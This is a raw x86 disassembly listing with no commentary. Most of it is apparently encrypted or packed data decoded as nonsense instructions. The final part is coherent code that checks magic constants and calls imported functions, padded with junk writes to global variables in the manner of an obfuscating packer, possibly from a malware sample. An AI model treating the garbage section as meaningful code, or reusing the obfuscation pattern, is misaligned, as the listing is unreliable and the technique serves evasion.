  41bb11:	leave  
  41bb12:	and    DWORD PTR [eax-0x3fb6c752],ebx
  41bb18:	sbb    bh,ch
  41bb1a:	imul   ebp,edx,0xffffffcc
  41bb1d:	cmp    bl,BYTE PTR [edx+0x4a]
  41bb20:	outs   dx,DWORD PTR ds:[esi]
  41bb21:	pop    esi
  41bb22:	mov    BYTE PTR [ebp-0x4c],ah
  41bb25:	adc    ch,bl
  41bb27:	leave  
  41bb28:	cmp    BYTE PTR [ebp+edi*4+0x33],dl
  41bb2c:	sahf   
  41bb2d:	popf   
  41bb2e:	cwde   
  41bb2f:	jns    0x41bacb
  41bb31:	pop    es
  41bb32:	std    
  41bb33:	cmp    eax,0x7dc1eee0
  41bb38:	aas    
  41bb39:	neg    BYTE PTR [eax+0x17]
  41bb3c:	inc    eax
  41bb3d:	hlt    
  41bb3e:	jg     0x41bb9c
  41bb40:	inc    esi
  41bb41:	lods   eax,DWORD PTR ds:[esi]
  41bb42:	in     al,dx
  41bb43:	mov    ds:0xd2eeffe0,al
  41bb48:	push   eax
  41bb49:	mov    bl,ch
  41bb4b:	fstp   TBYTE PTR [esi+0x6eb4b038]
  41bb51:	dec    edx
  41bb52:	int    0x51
  41bb54:	fidiv  DWORD PTR [ecx+0x30]
  41bb57:	cwde   
  41bb58:	push   ecx
  41bb59:	hlt    
  41bb5a:	add    BYTE PTR [edx+0x7b90962e],ah
  41bb60:	xchg   edi,eax
  41bb61:	into   
  41bb62:	cdq    
  41bb63:	jp     0x41bbe4
  41bb65:	lds    edi,FWORD PTR [eax+ebp*8-0x58]
  41bb69:	push   edx
  41bb6a:	in     eax,0x97
  41bb6c:	ficomp DWORD PTR [ecx-0x5b]
  41bb6f:	mov    dl,BYTE PTR ds:0x76db8b73
  41bb75:	xor    ch,BYTE PTR [edx]
  41bb77:	xchg   esi,eax
  41bb78:	out    0x3e,eax
  41bb7a:	lock add DWORD PTR ds:0x3516d0c7,0xffffffe3
  41bb82:	jle    0x41bbee
  41bb84:	or     DWORD PTR [ebp+0x31b92671],0x2aafeb67
  41bb8e:	sub    edx,DWORD PTR [edx]
  41bb90:	iret   
  41bb91:	pop    ds
  41bb92:	arpl   di,bp
  41bb94:	enter  0x8f31,0x1a
  41bb98:	call   0xbd43f414
  41bb9d:	and    DWORD PTR [esi],esp
  41bb9f:	adc    eax,0x570a007f
  41bba4:	push   edi
  41bba5:	mov    esi,0xb493039c
  41bbaa:	sub    ebp,eax
  41bbac:	sbb    al,bl
  41bbae:	mov    esi,?
  41bbb0:	pop    esp
  41bbb1:	into   
  41bbb2:	ret    0xfb0c
  41bbb5:	ds in  eax,dx
  41bbb7:	gs cmp eax,0xf4049f8d
  41bbbd:	out    dx,al
  41bbbe:	adc    DWORD PTR [edi+0x7e],ebp
  41bbc1:	(bad)  
  41bbc3:	xchg   edi,eax
  41bbc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbc5:	pop    ss
  41bbc6:	test   BYTE PTR [esi+0x5e],0x1e
  41bbca:	cdq    
  41bbcb:	(bad)  
  41bbcc:	mov    ebx,0xf9f6018a
  41bbd1:	mov    ebx,0x39de6404
  41bbd6:	pop    ds
  41bbd7:	jg     0x41bbdb
  41bbd9:	or     BYTE PTR [esi],0xc8
  41bbdc:	or     BYTE PTR [esi-0x5f2919fa],ch
  41bbe2:	out    dx,eax
  41bbe3:	aad    0x19
  41bbe5:	jnp    0x41bc45
  41bbe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbe8:	in     al,0x63
  41bbea:	retf   
  41bbeb:	mov    eax,0x1a08a04d
  41bbf0:	ins    DWORD PTR es:[edi],dx
  41bbf1:	retf   0xc39b
  41bbf4:	data16 and al,BYTE PTR [ebp-0xc3ece4e]
  41bbfb:	frstor [ecx-0x1a]
  41bbfe:	icebp  
  41bbff:	shl    DWORD PTR [esi],1
  41bc01:	pop    ebp
  41bc02:	retf   
  41bc03:	enter  0x73f8,0xb7
  41bc07:	mov    edi,0xeefe97d9
  41bc0c:	loope  0x41bc06
  41bc0e:	jg     0x41bc66
  41bc10:	push   ecx
  41bc11:	imul   edi,ebx,0x3a9d536c
  41bc17:	lods   al,BYTE PTR ds:[esi]
  41bc18:	mov    ebp,es
  41bc1a:	adc    eax,DWORD PTR [ecx+0x18]
  41bc1d:	mov    eax,0xec6cea63
  41bc22:	push   ebx
  41bc23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc24:	push   eax
  41bc25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc26:	test   DWORD PTR [edi],eax
  41bc28:	adc    bh,dh
  41bc2a:	xchg   dh,ch
  41bc2c:	scas   al,BYTE PTR es:[edi]
  41bc2d:	jle    0x41bbe5
  41bc2f:	cmovg  ebx,DWORD PTR [ecx]
  41bc32:	mov    esi,0xb0b02671
  41bc37:	sbb    DWORD PTR [ebp-0x32b66669],eax
  41bc3d:	mov    BYTE PTR [esi+0x69],bh
  41bc40:	not    DWORD PTR [esi+edx*4]
  41bc43:	fwait
  41bc44:	aaa    
  41bc45:	add    esi,DWORD PTR [edi-0x9bb6860]
  41bc4b:	aad    0xc6
  41bc4d:	and    edx,esi
  41bc4f:	jge    0x41bca1
  41bc51:	loop   0x41bca6
  41bc53:	stc    
  41bc54:	xchg   ecx,eax
  41bc55:	fidivr WORD PTR [ebx]
  41bc57:	(bad)  
  41bc59:	sbb    al,0xb8
  41bc5b:	jp     0x41bca7
  41bc5d:	ins    BYTE PTR es:[edi],dx
  41bc5e:	adc    eax,0x7b160cee
  41bc63:	cmc    
  41bc64:	push   esp
  41bc65:	push   es
  41bc66:	mov    cl,0x48
  41bc68:	fdivrp st(2),st
  41bc6a:	pop    ebx
  41bc6b:	cmp    BYTE PTR [ecx+0x76],0x6e
  41bc6f:	inc    ebx
  41bc70:	pop    ss
  41bc71:	dec    bp
  41bc73:	ds dec edx
  41bc75:	pop    ebx
  41bc76:	inc    edx
  41bc77:	xor    edx,DWORD PTR [eax]
  41bc79:	sbb    BYTE PTR [eax+0x7d3c430c],dh
  41bc7f:	rcr    DWORD PTR [edx],0xcb
  41bc82:	and    BYTE PTR [eax-0x2f1daf17],dl
  41bc88:	xor    DWORD PTR [ecx+0x4198caab],0x54
  41bc8f:	in     al,0xd8
  41bc91:	inc    ebp
  41bc92:	adc    ch,cl
  41bc94:	adc    BYTE PTR [eax-0x68737666],bl
  41bc9a:	mov    bh,0xe6
  41bc9c:	adc    BYTE PTR [ecx+0x478360e0],dl
  41bca2:	retf   
  41bca3:	cwde   
  41bca4:	(bad)  
  41bca5:	jmp    0x9e4b:0xe93e50b3
  41bcac:	popf   
  41bcad:	out    dx,eax
  41bcae:	adc    DWORD PTR [esi-0x66],ecx
  41bcb1:	inc    eax
  41bcb2:	cli    
  41bcb3:	sub    BYTE PTR [edx],0x8b
  41bcb6:	das    
  41bcb7:	push   es
  41bcb8:	adc    dh,BYTE PTR [ecx+0x572ccb9a]
  41bcbe:	dec    edx
  41bcbf:	ret    0xe19
  41bcc2:	(bad)  
  41bcc3:	pop    ss
  41bcc4:	jge    0x41bd41
  41bcc6:	int3   
  41bcc7:	cdq    
  41bcc8:	or     al,0x32
  41bcca:	push   eax
  41bccb:	mov    al,dl
  41bccd:	bound  esp,QWORD PTR [eiz*2+0x4ec02964]
  41bcd4:	neg    DWORD PTR [edi+0x781fc674]
  41bcda:	sbb    DWORD PTR ds:0x2bbccd36,edi
  41bce0:	jmp    0x41bc72
  41bce2:	push   ebx
  41bce3:	bound  ecx,QWORD PTR [edx+0x6c3b548d]
  41bce9:	push   esp
  41bcea:	push   cs
  41bceb:	push   ebx
  41bcec:	repnz sub al,0x62
  41bcf0:	das    
  41bcf1:	inc    edi
  41bcf2:	jns    0x41bd73
  41bcf4:	cmp    DWORD PTR ds:0xd131c0dc,ebp
  41bcfa:	push   cs
  41bcfb:	aas    
  41bcfc:	adc    al,0x22
  41bcfe:	je     0x41bd27
  41bd00:	sbb    BYTE PTR [edx],cl
  41bd02:	jle    0x41bca6
  41bd04:	adc    edi,ebx
  41bd06:	cs mov cl,0xcf
  41bd09:	xor    eax,0x3fd0d1bc
  41bd0e:	xor    dl,ch
  41bd10:	or     al,0xa4
  41bd12:	sbb    esp,0x2d
  41bd15:	into   
  41bd16:	fistp  DWORD PTR [edi]
  41bd18:	jnp    0x41bd41
  41bd1a:	xchg   ecx,eax
  41bd1b:	jae    0x41bd41
  41bd1d:	in     eax,0xb6
  41bd1f:	mov    esi,0x40b78243
  41bd24:	mov    edx,0xf1560604
  41bd29:	jo     0x41bcf6
  41bd2b:	and    DWORD PTR [edi+0x36],0x1da45627
  41bd32:	mov    al,0x57
  41bd34:	add    ah,ch
  41bd36:	and    al,0x7c
  41bd38:	and    BYTE PTR [edi],cl
  41bd3a:	ds jae 0x41bce1
  41bd3d:	jno    0x41bd53
  41bd3f:	int    0x6e
  41bd41:	dec    ecx
  41bd42:	xchg   ebx,eax
  41bd43:	dec    ecx
  41bd44:	enter  0x14a6,0x65
  41bd48:	sbb    ebp,edx
  41bd4a:	pop    esi
  41bd4b:	xchg   bh,dh
  41bd4d:	inc    edx
  41bd4e:	sub    eax,ecx
  41bd50:	ret    
  41bd51:	rcr    DWORD PTR [edi+ecx*4],0x32
  41bd55:	push   eax
  41bd56:	call   0xf864:0xb2a7834a
  41bd5d:	out    0xbb,eax
  41bd5f:	dec    ecx
  41bd60:	idiv   DWORD PTR [edx-0x4ea9712f]
  41bd66:	pop    esi
  41bd67:	and    esp,edi
  41bd69:	ret    0xbfba
  41bd6c:	and    al,0xec
  41bd6e:	inc    edx
  41bd6f:	(bad)  
  41bd70:	cmp    al,0xf3
  41bd72:	fwait
  41bd73:	pop    ebp
  41bd74:	pop    ds
  41bd75:	xor    cl,BYTE PTR [edx-0x48547371]
  41bd7b:	pop    eax
  41bd7c:	xor    DWORD PTR [ecx],edx
  41bd7e:	icebp  
  41bd7f:	xchg   esi,eax
  41bd80:	and    eax,0xb43fe022
  41bd85:	pop    ecx
  41bd86:	sti    
  41bd87:	dec    eax
  41bd88:	stc    
  41bd89:	(bad)  
  41bd8a:	mov    ah,0x78
  41bd8c:	mov    al,ds:0xaa9011d8
  41bd91:	push   ecx
  41bd92:	or     ecx,ebp
  41bd94:	(bad)  
  41bd95:	(bad)  
  41bd97:	pop    ebp
  41bd98:	mov    ch,0xad
  41bd9a:	dec    ebp
  41bd9b:	inc    edx
  41bd9c:	(bad)  
  41bd9e:	inc    esi
  41bd9f:	outs   dx,DWORD PTR ds:[esi]
  41bda0:	xchg   edx,eax
  41bda1:	outs   dx,BYTE PTR ds:[esi]
  41bda2:	(bad)  
  41bda3:	jle    0x41bdaf
  41bda5:	mov    bh,0x97
  41bda7:	mov    esp,0x8678f864
  41bdac:	mov    fs,WORD PTR ds:[edi-0x40]
  41bdb0:	push   ecx
  41bdb1:	xchg   ebx,eax
  41bdb2:	adc    eax,0xf54ccf7d
  41bdb7:	inc    ebp
  41bdb8:	mov    ebp,0x6eaa55a7
  41bdbd:	outs   dx,BYTE PTR ds:[esi]
  41bdbe:	ds popf 
  41bdc0:	or     DWORD PTR [esi],ecx
  41bdc2:	sbb    DWORD PTR [eax+0x4ba09568],edi
  41bdc8:	push   ecx
  41bdc9:	or     dh,dh
  41bdcb:	sbb    eax,0x467dc059
  41bdd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bdd1:	pop    ss
  41bdd2:	mov    ebx,edx
  41bdd4:	dec    esi
  41bdd5:	mov    DWORD PTR [ebx+0x7f2905c7],esi
  41bddb:	fsub   st,st(1)
  41bddd:	std    
  41bdde:	adc    eax,ebp
  41bde0:	ss cmc 
  41bde2:	jae    0x41bd64
  41bde4:	(bad)  
  41bde5:	fst    DWORD PTR [edi-0x6b]
  41bde8:	or     eax,0x2296c9fc
  41bded:	les    ebp,FWORD PTR [ecx-0x14706687]
  41bdf3:	xchg   ebp,eax
  41bdf4:	mov    esp,0x29f260ea
  41bdf9:	arpl   WORD PTR [ecx+0x7b],bx
  41bdfc:	scas   al,BYTE PTR es:[edi]
  41bdfd:	dec    eax
  41bdfe:	sub    DWORD PTR [eax+0x76e0c5c],ebp
  41be04:	fs mov ebx,0xfa46ea34
  41be0a:	jl     0x41bdfd
  41be0c:	aad    0x9e
  41be0e:	pop    esp
  41be0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be10:	ficom  WORD PTR [esp+ebp*2-0xf]
  41be14:	push   es
  41be15:	cmp    eax,0x1bf90a4f
  41be1a:	sub    dl,0x4f
  41be1d:	jmp    0x6236:0x6dbb97f5
  41be24:	inc    edx
  41be25:	jp     0x41bdca
  41be27:	add    al,0x8e
  41be29:	sbb    eax,ebx
  41be2b:	inc    ecx
  41be2c:	addr16 repz dec esi
  41be2f:	fld    QWORD PTR [bp+di-0xa]
  41be33:	push   ecx
  41be34:	scas   eax,DWORD PTR es:[edi]
  41be35:	push   eax
  41be36:	xor    DWORD PTR [edi-0x8],eax
  41be39:	imul   eax,DWORD PTR ds:0xbe5a20dc,0xb92f1fb8
  41be43:	adc    BYTE PTR [edx],bh
  41be45:	cmp    BYTE PTR [ebp+0x21],0x91
  41be49:	dec    edi
  41be4a:	sbb    eax,0xe70f3bfc
  41be4f:	hlt    
  41be50:	ins    BYTE PTR es:[edi],dx
  41be51:	mov    ah,BYTE PTR [eax+0x62ceda0a]
  41be57:	aaa    
  41be58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be59:	add    DWORD PTR [edi],ebx
  41be5b:	cmp    bh,BYTE PTR [ebx+0x5afd43af]
  41be61:	xchg   esp,eax
  41be62:	push   ebp
  41be63:	jbe    0x41beb9
  41be65:	in     al,0xab
  41be67:	test   BYTE PTR [eax],cl
  41be69:	inc    edi
  41be6a:	or     BYTE PTR [eax],bl
  41be6c:	into   
  41be6d:	mov    ?,ecx
  41be6f:	test   eax,0x94c60a1d
  41be74:	ret    
  41be75:	in     eax,dx
  41be76:	mov    ebp,0x446a2dcf
  41be7b:	push   0xc6606412
  41be80:	dec    ebx
  41be81:	dec    eax
  41be82:	push   esp
  41be83:	adc    dl,BYTE PTR [ebp-0x1]
  41be86:	or     DWORD PTR [ebp-0x19],0xffffffed
  41be8a:	sub    ch,BYTE PTR [edi]
  41be8c:	aas    
  41be8d:	mov    eax,ds:0x6997b1ba
  41be92:	mov    gs,WORD PTR [edi-0x63]
  41be95:	jb     0x41bf12
  41be97:	inc    ebx
  41be98:	shr    BYTE PTR [edi+0x7cbd9198],1
  41be9e:	mov    edi,0xc0c09409
  41bea3:	xchg   ecx,eax
  41bea4:	dec    ebx
  41bea5:	fwait
  41bea6:	xor    BYTE PTR [edx-0x3e],0xb5
  41beaa:	mov    edi,0xdab28cb7
  41beaf:	shr    DWORD PTR [esi+esi*2+0x51a2abd4],1
  41beb6:	sbb    al,0x98
  41beb8:	add    esi,ebp
  41beba:	or     al,0x66
  41bebc:	cmp    BYTE PTR [ecx+ebx*4-0x530e872b],0xea
  41bec4:	dec    ebp
  41bec5:	addr16 jp 0x41beb2
  41bec8:	test   eax,0xcedbebfa
  41becd:	and    bl,BYTE PTR [ecx]
  41becf:	lahf   
  41bed0:	push   esi
  41bed1:	xchg   edx,eax
  41bed2:	jp     0x41bed6
  41bed4:	mov    edx,0x7f3a43fb
  41bed9:	sbb    BYTE PTR [edx-0x50],0x59
  41bedd:	dec    ecx
  41bede:	dec    eax
  41bedf:	xchg   edx,eax
  41bee0:	loope  0x41bea9
  41bee2:	sahf   
  41bee3:	xchg   BYTE PTR [edi-0x22860db1],ah
  41bee9:	pop    ebx
  41beea:	dec    ecx
  41beeb:	ja     0x41bec7
  41beed:	call   0xc39e8b72
  41bef2:	scas   eax,DWORD PTR es:[edi]
  41bef3:	pop    ebx
  41bef4:	or     eax,0x64ced553
  41bef9:	fld    QWORD PTR [ebx+0x42]
  41befc:	mov    DWORD PTR [ecx+esi*2+0xb],0xfe530c29
  41bf04:	push   es
  41bf05:	mov    al,0xa
  41bf07:	adc    esi,esi
  41bf09:	stc    
  41bf0a:	and    al,0xd3
  41bf0c:	and    al,0x9c
  41bf0e:	mov    ah,ah
  41bf10:	and    BYTE PTR [ecx-0x78],bl
  41bf13:	das    
  41bf14:	loop   0x41bf15
  41bf16:	imul   ecx,DWORD PTR [ecx],0xffffffd9
  41bf19:	add    BYTE PTR [ebx+edi*2],0x32
  41bf1d:	push   0xe1c96a2d
  41bf22:	and    bl,al
  41bf24:	mov    ds:0x21a632db,al
  41bf29:	call   0xa0ec:0x4f73453
  41bf30:	aad    0x85
  41bf32:	sbb    DWORD PTR [eax-0x2],ebx
  41bf35:	or     esi,DWORD PTR [ecx-0x775c891a]
  41bf3b:	or     dh,al
  41bf3d:	push   ecx
  41bf3e:	dec    esi
  41bf3f:	mov    al,ds:0x99b2c8ed
  41bf44:	rol    ecx,cl
  41bf46:	and    al,0x37
  41bf48:	push   edx
  41bf49:	add    DWORD PTR [ebx],edi
  41bf4b:	push   esi
  41bf4c:	and    eax,0x43031631
  41bf51:	rcr    DWORD PTR [ebp+edi*8+0x69],1
  41bf55:	jae    0x41bf35
  41bf57:	xor    bh,bl
  41bf59:	or     bh,0x66
  41bf5c:	and    eax,0x4e308de0
  41bf61:	popa   
  41bf62:	mov    edi,0x6bc741dc
  41bf67:	mov    eax,0xaa7b8e0a
  41bf6c:	pop    ecx
  41bf6d:	pop    ds
  41bf6e:	jmp    0x41bf6c
  41bf70:	shl    DWORD PTR [ecx+edi*4-0x33],cl
  41bf74:	pushfw 
  41bf76:	sbb    eax,0x528a0b9b
  41bf7b:	sbb    al,0xd6
  41bf7d:	dec    esp
  41bf7e:	adc    edx,eax
  41bf80:	add    ecx,ecx
  41bf82:	push   esp
  41bf83:	aad    0x35
  41bf85:	nop
  41bf86:	lods   eax,DWORD PTR ds:[esi]
  41bf87:	push   cs
  41bf88:	popa   
  41bf89:	inc    eax
  41bf8a:	js     0x41bf6d
  41bf8c:	test   ah,ch
  41bf8e:	adc    DWORD PTR [esi+0xe0a5ee8],0xffffffc5
  41bf95:	sub    edx,DWORD PTR [eax+edx*2-0x3e]
  41bf99:	jb     0x41bf2e
  41bf9b:	rep lods eax,DWORD PTR ds:[esi]
  41bf9d:	xor    DWORD PTR [esi],ebp
  41bf9f:	xchg   ecx,eax
  41bfa0:	add    esp,ecx
  41bfa2:	out    dx,al
  41bfa3:	mov    ds:0xf2890ed0,al
  41bfa8:	sbb    ch,dh
  41bfaa:	xchg   esp,eax
  41bfab:	mov    ebx,0x488c2687
  41bfb0:	(bad)  
  41bfb1:	mul    dl
  41bfb3:	xor    al,0x39
  41bfb5:	dec    esi
  41bfb6:	push   cs
  41bfb7:	mov    esp,0xf61ccfd9
  41bfbc:	push   ebp
  41bfbd:	int3   
  41bfbe:	jb     0x41bfee
  41bfc0:	rcr    BYTE PTR ds:0xe2de2051,cl
  41bfc6:	or     cl,BYTE PTR [ecx-0x23ac6aaa]
  41bfcc:	dec    BYTE PTR [edi-0x75f3b6b8]
  41bfd2:	pop    ss
  41bfd3:	sub    al,0xaf
  41bfd5:	push   eax
  41bfd6:	dec    ecx
  41bfd7:	push   esi
  41bfd8:	fiadd  DWORD PTR [ecx]
  41bfda:	jne    0x41c003
  41bfdc:	xor    eax,0x70e972d4
  41bfe1:	and    ecx,DWORD PTR [eax+ecx*8+0x4a]
  41bfe5:	(bad)  
  41bfe6:	mov    esi,ebp
  41bfe8:	or     al,0x3c
  41bfea:	sub    edx,DWORD PTR [esi]
  41bfec:	aas    
  41bfed:	push   esp
  41bfee:	inc    esp
  41bfef:	add    DWORD PTR ds:0x7043d298,esi
  41bff5:	jp     0x41bfdc
  41bff7:	xchg   edx,eax
  41bff9:	xchg   edx,eax
  41bffa:	jmp    0xb8dd1f81
  41bfff:	ins    DWORD PTR es:[edi],dx
  41c000:	not    BYTE PTR [ecx]
  41c002:	popf   
  41c003:	stos   DWORD PTR es:[edi],eax
  41c004:	loopne 0x41bfd8
  41c006:	addr16 fs jmp 0x41c07d
  41c00a:	arpl   WORD PTR [ecx+0x23f1863b],ax
  41c010:	mov    cs,WORD PTR [edi]
  41c012:	ja     0x41c07e
  41c014:	addr16 jmp 0xe159:0x83d1e769
  41c01c:	push   edi
  41c01d:	jno    0x41c078
  41c01f:	push   es
  41c020:	les    ebp,FWORD PTR [ebx]
  41c022:	sbb    al,0xd7
  41c024:	inc    eax
  41c025:	repz cmps DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41c028:	sbb    BYTE PTR [ebx+0x1f],cl
  41c02b:	xchg   esi,eax
  41c02c:	dec    edi
  41c02d:	xchg   esi,eax
  41c02e:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41c030:	jno    0x41bfec
  41c032:	mov    ecx,0xb3bc7829
  41c037:	dec    eax
  41c038:	pop    edi
  41c039:	ins    DWORD PTR es:[edi],dx
  41c03a:	push   ebp
  41c03b:	jne    0x41c069
  41c03d:	mov    ch,0x5a
  41c03f:	adc    BYTE PTR [eax+0x28c20ba4],0xb4
  41c046:	or     eax,0x836c0538
  41c04b:	adc    ch,bl
  41c04d:	popf   
  41c04e:	retf   
  41c04f:	iret   
  41c050:	mov    ebp,DWORD PTR [ecx-0x706d25a1]
  41c056:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c057:	mov    ch,0x63
  41c059:	ins    DWORD PTR es:[edi],dx
  41c05a:	mov    ch,0xc
  41c05c:	xchg   edx,eax
  41c05d:	push   cs
  41c05e:	cwde   
  41c05f:	adc    ch,BYTE PTR [edx-0x31dc5f15]
  41c065:	test   bl,ah
  41c067:	push   edx
  41c068:	cmp    eax,0xf3578ad4
  41c06d:	jae    0x41c08e
  41c06f:	xor    al,0xf1
  41c071:	mov    ecx,0x846610d9
  41c076:	push   edx
  41c077:	outs   dx,BYTE PTR ds:[esi]
  41c078:	(bad)  
  41c079:	mov    ah,0xb4
  41c07b:	(bad)  
  41c07d:	mov    al,BYTE PTR [esp+ebp*2]
  41c080:	jne    0x41c01f
  41c082:	inc    esi
  41c083:	inc    ecx
  41c084:	push   ds
  41c085:	outs   dx,DWORD PTR ds:[esi]
  41c086:	inc    ecx
  41c087:	aas    
  41c088:	add    al,BYTE PTR [edx-0x1a]
  41c08b:	mov    cl,0x4a
  41c08d:	call   FWORD PTR [edi]
  41c08f:	cdq    
  41c090:	es mov ebx,esi
  41c093:	mov    cl,al
  41c095:	mov    eax,esi
  41c097:	adc    edi,DWORD PTR [edx-0x1b]
  41c09a:	loop   0x41c076
  41c09c:	inc    esi
  41c09d:	jge    0x41c092
  41c09f:	mov    cs,WORD PTR [esi+0x2d]
  41c0a2:	sbb    eax,0x6bda425
  41c0a7:	xchg   ebx,eax
  41c0a8:	dec    edx
  41c0a9:	inc    ebp
  41c0aa:	and    BYTE PTR [ebx],ah
  41c0ac:	sub    BYTE PTR [esi+0x6ed5abe2],0xfb
  41c0b3:	or     esi,esi
  41c0b5:	sahf   
  41c0b6:	icebp  
  41c0b7:	test   al,0xda
  41c0b9:	pop    edi
  41c0ba:	lock xchg esp,eax
  41c0bc:	gs loopne 0x41c0c2
  41c0bf:	jb     0x41c08f
  41c0c1:	fsubrp st(0),st
  41c0c3:	xchg   BYTE PTR [ebp-0x55],cl
  41c0c6:	outs   dx,BYTE PTR ds:[esi]
  41c0c7:	cmp    ecx,edi
  41c0c9:	sbb    al,0x71
  41c0cb:	push   ecx
  41c0cc:	or     edi,ebp
  41c0ce:	add    esi,eax
  41c0d0:	add    BYTE PTR [esi-0x6a],al
  41c0d3:	test   eax,ebp
  41c0d5:	pop    ebp
  41c0d6:	fadd   DWORD PTR es:[eax+0x7778b47]
  41c0dd:	fsub   st,st(7)
  41c0df:	fcomip st,st(5)
  41c0e1:	add    dl,ah
  41c0e3:	adc    BYTE PTR [esi],ch
  41c0e5:	and    BYTE PTR [ecx],ah
  41c0e7:	mov    bl,0x5c
  41c0e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0ea:	clc    
  41c0eb:	xchg   esi,eax
  41c0ec:	cmp    dl,BYTE PTR [esi]
  41c0ee:	dec    edx
  41c0ef:	and    al,0x42
  41c0f1:	cmc    
  41c0f2:	repnz push es
  41c0f4:	lods   eax,DWORD PTR ds:[esi]
  41c0f5:	xchg   ebp,eax
  41c0f6:	sbb    ebp,esi
  41c0f8:	lods   eax,DWORD PTR ds:[esi]
  41c0fa:	call   0xe84d:0x8b31f30f
  41c101:	add    edi,edx
  41c103:	cmp    ecx,edi
  41c105:	je     0x41c147
  41c10b:	mov    ecx,DWORD PTR [ebp-0x18]
  41c10e:	add    ecx,eax
  41c110:	mov    DWORD PTR [ebp-0x1c],ecx
  41c113:	mov    ecx,DWORD PTR [ebp-0x30]
  41c116:	mov    edx,DWORD PTR [ebp-0x2c]
  41c119:	mov    edx,0xa147
  41c11e:	xor    cx,dx
  41c121:	mov    edx,DWORD PTR [ebp-0x1c]
  41c124:	mov    edx,DWORD PTR [edx+0xc]
  41c127:	add    cx,si
  41c12a:	cmp    WORD PTR [eax+edx*1],cx
  41c12e:	jne    0x41c147
  41c134:	mov    ecx,DWORD PTR ds:0x4262c9
  41c13a:	mov    ecx,DWORD PTR [ecx+0x198]
  41c140:	mov    DWORD PTR [ecx],eax
  41c142:	jmp    0x41c1c5
  41c147:	push   DWORD PTR [ebp+0x1c]
  41c14a:	push   DWORD PTR [ebp+0x18]
  41c14d:	jmp    0x41c1b4
  41c152:	mov    eax,DWORD PTR [ebp+0x18]
  41c155:	mov    ecx,DWORD PTR [ebp+0x1c]
  41c158:	cmp    eax,0x70941f9e
  41c15d:	jne    0x41c176
  41c163:	cmp    ecx,ebx
  41c165:	jne    0x41c176
  41c16b:	push   ebx
  41c16c:	push   0x70941f9b
  41c171:	jmp    0x41c1b4
  41c176:	mov    ecx,DWORD PTR [ebp+0x18]
  41c179:	mov    edx,DWORD PTR [ebp+0x1c]
  41c17c:	mov    eax,0x70941f98
  41c181:	cmp    ecx,eax
  41c183:	jne    0x41c198
  41c189:	cmp    edx,ebx
  41c18b:	jne    0x41c198
  41c191:	push   ebx
  41c192:	push   edi
  41c193:	jmp    0x41c1b4
  41c198:	mov    ecx,DWORD PTR [ebp+0x18]
  41c19b:	mov    edx,DWORD PTR [ebp+0x1c]
  41c19e:	cmp    ecx,0x70941f9b
  41c1a4:	jne    0x41c1c5
  41c1aa:	cmp    edx,ebx
  41c1ac:	jne    0x41c1c5
  41c1b2:	push   ebx
  41c1b3:	push   eax
  41c1b4:	push   DWORD PTR [ebp+0x14]
  41c1b7:	push   DWORD PTR [ebp+0x10]
  41c1ba:	push   DWORD PTR [ebp+0xc]
  41c1bd:	push   DWORD PTR [ebp+0x8]
  41c1c0:	call   0x417355
  41c1c5:	pop    edi
  41c1c6:	pop    esi
  41c1c7:	pop    ebx
  41c1c8:	leave  
  41c1c9:	ret    0x18
  41c1cc:	push   ebp
  41c1cd:	mov    ebp,esp
  41c1cf:	and    esp,0xfffffff8
  41c1d2:	add    DWORD PTR ds:0x426f09,0x426ef5
  41c1dc:	mov    al,ds:0x4263ef
  41c1e1:	sub    esp,0x54
  41c1e4:	mov    DWORD PTR ds:0x426eb5,0x2e24
  41c1ee:	push   ebx
  41c1ef:	push   esi
  41c1f0:	push   edi
  41c1f1:	mov    DWORD PTR ds:0x426f15,0x7495
  41c1fb:	cmp    al,BYTE PTR ds:0x4263fa
  41c201:	mov    DWORD PTR ds:0x426ee9,0x194c
  41c20b:	je     0x41c22c
  41c211:	or     DWORD PTR ds:0x426eed,0x426ed5
  41c21b:	xor    eax,eax
  41c21d:	mov    DWORD PTR ds:0x426ee1,0xaaa
  41c227:	jmp    0x41d276
  41c22c:	mov    al,ds:0x42640c
  41c231:	cmp    al,BYTE PTR ds:0x42641b
  41c237:	mov    DWORD PTR ds:0x426ee9,0x1f8d
  41c241:	jne    0x41c211
  41c247:	neg    edi
  41c249:	mov    edi,DWORD PTR ds:0x430a50
  41c24f:	and    DWORD PTR ds:0x426ee1,0x426e95
  41c259:	push   0x426425
  41c25e:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c268:	push   0x426435
  41c26d:	adc    DWORD PTR ds:0x426eed,0x426ed5
  41c277:	call   edi
  41c279:	test   eax,eax
  41c27b:	mov    DWORD PTR ds:0x426ee5,0x502f
  41c285:	je     0x41c211
  41c28b:	push   0x426449
  41c290:	and    DWORD PTR ds:0x426f1d,0x426ef1
  41c29a:	call   DWORD PTR ds:0x430a34
  41c2a0:	mov    DWORD PTR [esp+0x44],0x0
  41c2a8:	mov    ecx,0xf89c85b5
  41c2ad:	mov    DWORD PTR [esp+0x10],ecx
  41c2b1:	mov    DWORD PTR ds:0x426edd,0x1a
  41c2bb:	cmp    DWORD PTR ds:0x426edd,0x0
  41c2c2:	je     0x41c31b
  41c2c8:	cmp    DWORD PTR ds:0x426edd,0x7
  41c2cf:	jle    0x41c31b
  41c2d5:	jmp    0x41c2ed
  41c2da:	push   DWORD PTR [ebp-0x20]
  41c2dd:	push   0x4e76
  41c2e2:	push   0x4592
  41c2e7:	call   DWORD PTR ds:0x430a18
  41c2ed:	cmp    DWORD PTR ds:0x426edd,0x8
  41c2f4:	jne    0x41c309
  41c2fa:	xor    edx,edx
  41c2fc:	add    edx,DWORD PTR ds:0x426edd
  41c302:	dec    edx
  41c303:	mov    DWORD PTR ds:0x426edd,edx
  41c309:	mov    edx,DWORD PTR ds:0x426edd
  41c30f:	dec    edx
  41c310:	mov    DWORD PTR ds:0x426edd,edx
  41c316:	jmp    0x41c2bb
  41c31b:	mov    DWORD PTR [esp+0x1c],0xf89c85b4
